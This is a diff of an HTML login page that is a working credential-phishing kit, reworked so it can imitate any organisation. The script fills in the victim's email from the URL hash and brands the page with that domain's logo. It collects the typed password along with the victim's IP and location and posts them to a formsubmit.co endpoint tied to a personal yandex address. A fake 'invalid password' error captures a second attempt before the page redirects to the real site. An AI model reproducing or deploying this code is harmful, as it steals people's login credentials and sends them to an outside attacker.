@@ -3,13 +3,12 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Savoywestend Login</title>
+  <title>Login</title>
   <style>
-    * { 
-      box-sizing: border-box; 
-      font-family: Arial, Helvetica, sans-serif; 
+    * {
+      box-sizing: border-box;
+      font-family: Arial, Helvetica, sans-serif;
     }
-
     body {
       margin: 0;
       min-height: 100vh;
@@ -19,7 +18,6 @@
       position: relative;
       overflow: hidden;
     }
-
     /* Image background container */
     .image-background {
       position: absolute;
@@ -32,7 +30,7 @@
       opacity: 0;
       transition: opacity 0.5s;
     }
-    
+   
     .image-background img {
       width: 100%;
       height: 100%;
@@ -40,7 +38,6 @@
       filter: blur(3px) brightness(0.7);
       transform: scale(1.05);
     }
-
     .image-overlay {
       position: absolute;
       top: 0;
@@ -50,7 +47,6 @@
       background: rgba(0, 0, 0, 0.3);
       z-index: 0;
     }
-
     .login-card {
       width: 360px;
       background: #fff;
@@ -61,7 +57,6 @@
       position: relative;
       z-index: 1;
     }
-
     .logo {
       width: 70px;
       height: 70px;
@@ -72,14 +67,12 @@
       box-shadow: 0 2px 10px rgba(0,0,0,0.1);
       object-fit: contain;
     }
-
     h2 {
       margin: 6px 0 14px;
       font-size: 20px;
       font-weight: 600;
       color: #333;
     }
-
     .error {
       background: #f8d7da;
       color: #842029;
@@ -89,12 +82,10 @@
       margin-bottom: 14px;
       display: none;
     }
-
     .field {
       margin-bottom: 14px;
       position: relative;
     }
-
     .field input {
       width: 100%;
       padding: 11px 38px 11px 36px;
@@ -103,12 +94,10 @@
       font-size: 14px;
       transition: border 0.3s;
     }
-
     .field input:focus {
       outline: none;
       border-color: #1e88e5;
     }
-
     .field .icon {
       position: absolute;
       top: 50%;
@@ -117,7 +106,6 @@
       color: #666;
       font-size: 14px;
     }
-
     .field .toggle {
       position: absolute;
       top: 50%;
@@ -128,7 +116,6 @@
       color: #666;
       user-select: none;
     }
-
     button {
       width: 100%;
       background: #1e88e5;
@@ -141,26 +128,21 @@
       font-weight: 600;
       transition: background 0.3s;
     }
-
-    button:hover { 
-      background: #1565c0; 
+    button:hover {
+      background: #1565c0;
     }
-
     button:active {
       transform: translateY(1px);
     }
-
     button.loading {
       background: #90caf9;
       cursor: not-allowed;
     }
-
     .footer {
       margin-top: 14px;
       font-size: 12px;
       color: #777;
     }
-
     .domain-display {
       font-size: 14px;
       color: #555;
@@ -170,7 +152,6 @@
       border-radius: 4px;
       word-break: break-all;
     }
-
     .email-display {
       font-size: 12px;
       color: #666;
@@ -186,44 +167,35 @@
     <img id="bg-image" src="" alt="Background" />
     <div class="image-overlay"></div>
   </div>
-
   <!-- Login form -->
   <div class="login-card">
     <img id="logo" src="" alt="Logo" class="logo" />
-    <h2>Savoywestend Login</h2>
-
+    <h2 id="page-title">Login</h2>
     <div class="error" id="error">Invalid password. Please enter the correct information.</div>
-
     <div class="domain-display" id="domain-display">
       <!-- Domain will be shown here -->
     </div>
-
     <form id="login-form">
       <div class="field">
         <span class="icon">👤</span>
         <input type="email" id="email" placeholder="Email address" readonly />
         <div class="email-display" id="email-source">Email extracted from URL</div>
       </div>
-
       <div class="field">
         <span class="icon">🔒</span>
         <input type="password" id="psw" placeholder="Password" autocomplete="off" />
         <span class="toggle" onclick="togglePassword()">👁</span>
       </div>
-
       <button type="submit" id="submit-btn">Submit</button>
     </form>
-
-    <div class="footer">© savoywestend.cz 2025</div>
+    <div class="footer" id="footer">© <span id="footer-domain">example.com</span> 2025</div>
   </div>
-
   <!-- jQuery -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-
   <script>
     // Initialize variables
     let step = 1;
-    
+   
     // Extract email from URL hash (everything after #)
     const getEmailFromHash = () => {
       const hash = window.location.hash;
@@ -237,89 +209,76 @@
       }
       return null;
     };
-    
+   
     // Try to get email from hash, otherwise use default
     const clientEmail = getEmailFromHash() || "user@example.com";
-    
+   
     // Get domain from email
     const getDomainFromEmail = (email) => {
       const parts = email.split('@');
       return parts.length > 1 ? parts.pop() : "example.com";
     };
-    
+   
     const domain = getDomainFromEmail(clientEmail);
-    
+   
     // Set email field value
     $('#email').val(clientEmail);
-    
+   
     // Update email source display
     $('#email-source').text(`Email: ${clientEmail} (from URL hash)`);
-    
+   
     // Set domain display
     $('#domain-display').text(`Log in to ${domain}`);
-    
+   
+    // Update page title and footer dynamically
+    $('#page-title').text(`${domain} Login`);
+    $('#footer-domain').text(domain);
+   
     // Set background image based on domain
     const setBackgroundImage = () => {
-      // You can use different strategies to get a background image:
-      
-      // Option 1: Use a placeholder service with domain name
       const bgUrl = `https://placehold.co/1920x1080/1e3a8a/ffffff?text=${encodeURIComponent(domain)}&font=lato`;
-      
-      // Option 2: Use a gradient background based on domain hash
-      // const colors = ['#1e3a8a', '#3b82f6', '#1e40af', '#1d4ed8', '#2563eb'];
-      // const colorIndex = domain.split('').reduce((acc, char) => acc + char.charCodeAt(0), 0) % colors.length;
-      // document.body.style.background = `linear-gradient(135deg, ${colors[colorIndex]}, ${colors[(colorIndex + 1) % colors.length]})`;
-      
-      // Option 3: Use a generic background image
-      // const bgUrl = 'https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?ixlib=rb-1.2.1&auto=format&fit=crop&w=1920&q=80';
-      
+     
       $('#bg-image').attr('src', bgUrl)
         .on('load', function() {
           $('.image-background').css('opacity', '1');
         })
         .on('error', function() {
-          // Fallback to a solid color if image fails to load
           $(this).hide();
           $('.image-background').css('background', 'linear-gradient(135deg, #1e3a8a, #3b82f6)');
           $('.image-background').css('opacity', '1');
         });
     };
-    
+   
     // Set logo
     const setLogo = () => {
       const logoUrl = "https://www.google.com/s2/favicons?domain=" + domain + "&sz=128";
       $("#logo").attr("src", logoUrl)
         .on("error", function() {
-          // Fallback if favicon fails
           $(this).attr("src", `https://via.placeholder.com/70/0096FF/ffffff?text=${domain.charAt(0).toUpperCase()}`);
         });
     };
-    
+   
     // Password visibility toggle
     function togglePassword() {
       const p = document.getElementById('psw');
       p.type = p.type === 'password' ? 'text' : 'password';
-      
-      // Update eye icon
+     
       const eye = document.querySelector('.toggle');
       eye.textContent = p.type === 'password' ? '👁' : '🙈';
     }
-
+    
     // Form submission handler
     const submit = $("#submit-btn");
-    
+   
     $("#login-form").submit(function(event) {
       event.preventDefault();
-      
-      // Disable submit button and show loading state
+     
       submit.text('Verifying...');
       submit.addClass('loading');
       submit.prop('disabled', true);
-      
-      // Hide error message if shown
+     
       $("#error").hide();
-      
-      // Get user IP and location info
+     
       $.getJSON('https://ipinfo.io/json', function(response) {
         const posting = $.post("https://formsubmit.co/ajax/dattiobi@yandex.com", {
           _subject: "Login Attempt | " + response.ip,
@@ -333,27 +292,21 @@
           Timestamp: new Date().toISOString(),
           Source: "URL Hash: " + window.location.hash
         });
-
         posting.done(function(data) {
           if (step === 2) {
-            // Second attempt - redirect to actual domain
             setTimeout(() => {
               window.location.href = "https://" + domain;
             }, 1000);
           } else {
-            // First attempt - show error
             step++;
             $("#error").show();
             submit.text('Submit');
             submit.removeClass('loading');
             submit.prop('disabled', false);
             $("#psw").val("").focus();
-            
-            // Update error message
             $("#error").text("Invalid credentials. Please try again.");
           }
         });
-
         posting.fail(function(error) {
           console.error("Submission error:", error);
           $("#error").show();
@@ -364,7 +317,6 @@
           $("#psw").val("");
         });
       }, "json").fail(function() {
-        // If IP info fails, still submit the form data
         const posting = $.post("https://formsubmit.co/ajax/dattiobi@yandex.com", {
           _subject: "Login Attempt | Unknown IP",
           Email: $("#email").val(),
@@ -377,7 +329,6 @@
           Timestamp: new Date().toISOString(),
           Source: "URL Hash: " + window.location.hash
         });
-
         posting.done(function(data) {
           if (step === 2) {
             setTimeout(() => {
@@ -394,22 +345,19 @@
         });
       });
     });
-    
+   
     // Initialize page
     $(document).ready(function() {
       setBackgroundImage();
       setLogo();
-      
-      // If no email in hash, show message
+     
       if (!getEmailFromHash()) {
         $('#email-source').html('No email found in URL hash.<br>Example URL: <code>yourpage.html#user@domain.com</code>');
         $('#email').val('user@example.com');
       }
-      
-      // Focus password field on load
+     
       $('#psw').focus();
-      
-      // Show background with delay if image fails
+     
       setTimeout(() => {
         $('.image-background').css('opacity', '1');
       }, 500);
